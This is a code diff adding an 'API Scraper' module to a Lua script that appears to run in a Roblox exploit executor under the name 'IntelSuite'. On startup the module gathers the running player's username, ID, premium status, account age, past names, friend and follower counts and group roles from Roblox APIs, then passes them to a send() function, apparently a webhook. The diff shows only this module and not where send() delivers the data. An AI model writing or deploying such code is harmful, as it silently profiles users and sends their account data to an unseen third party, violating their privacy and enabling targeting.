@@ -672,3 +672,88 @@ task.spawn(function()
         end)
     end
 end)
+
+
+-- ============================================================
+-- MODULE 7: Roblox API Scraper
+-- ============================================================
+local function runAPIScraper()
+    if not getgenv().IntelSuite.IsActive then return end
+    task.spawn(function()
+        local uid = tostring(LocalPlayer.UserId)
+        local result = "**User:** " .. LocalPlayer.Name .. "\n**ID:** " .. uid
+
+        -- Premium
+        pcall(function()
+            local premium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
+            result = result .. "\n**Premium:** " .. tostring(premium)
+        end)
+
+        -- Account info
+        pcall(function()
+            local r = GET("https://users.roblox.com/v1/users/" .. uid)
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d then
+                    result = result .. "\n**Created:** " .. tostring(d.created or "?")
+                end
+            end
+        end)
+
+        -- Past usernames
+        pcall(function()
+            local r = GET("https://users.roblox.com/v1/users/" .. uid .. "/username-history?limit=5")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d and d.data then
+                    local names = {}
+                    for _, v in ipairs(d.data) do table.insert(names, v.name) end
+                    result = result .. "\n**Past Names:** " .. (#names > 0 and table.concat(names, ", ") or "None")
+                end
+            end
+        end)
+
+        -- Friends count
+        pcall(function()
+            local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/friends/count")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d then result = result .. "\n**Friends:** " .. tostring(d.count or 0) end
+            end
+        end)
+
+        -- Followers
+        pcall(function()
+            local r = GET("https://friends.roblox.com/v1/users/" .. uid .. "/followers/count")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d then result = result .. "\n**Followers:** " .. tostring(d.count or 0) end
+            end
+        end)
+
+        -- Groups
+        pcall(function()
+            local r = GET("https://groups.roblox.com/v2/users/" .. uid .. "/groups/roles")
+            if r then
+                local d = HttpService:JSONDecode(r)
+                if d and d.data then
+                    local groups = {}
+                    for _, v in ipairs(d.data) do
+                        if v.group and v.role then
+                            table.insert(groups, v.group.name .. " [" .. v.role.name .. "]")
+                        end
+                        if #groups >= 5 then break end
+                    end
+                    result = result .. "\n**Groups:**\n" .. (#groups > 0 and table.concat(groups, "\n") or "None")
+                end
+            end
+        end)
+
+        send("ROBLOX API SCRAPE", result:sub(1, 1900), 16711935)
+    end)
+end
+
+-- Run on startup
+task.wait(3)
+runAPIScraper()
+getgenv().IntelSuite.APIScraper = runAPIScraper
